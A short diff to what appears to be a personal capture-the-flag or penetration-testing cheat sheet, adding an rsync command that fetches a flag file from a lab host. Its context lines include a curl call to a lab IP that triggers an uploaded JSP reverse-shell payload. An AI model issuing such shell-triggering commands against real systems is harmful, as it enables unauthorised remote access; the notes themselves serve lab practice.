@@ -11,3 +11,8 @@ hosts on windows : /windows/system32/drivers/etc/hosts
 
 > curl http://10.10.10.95:8080/rev_shell-9002/ppaejmsg.jsp
 ======================================
+
+
+===============================rsync==
+rsync -av rsync://10.129.157.60/public/flag.txt  flag.txt
+======================================
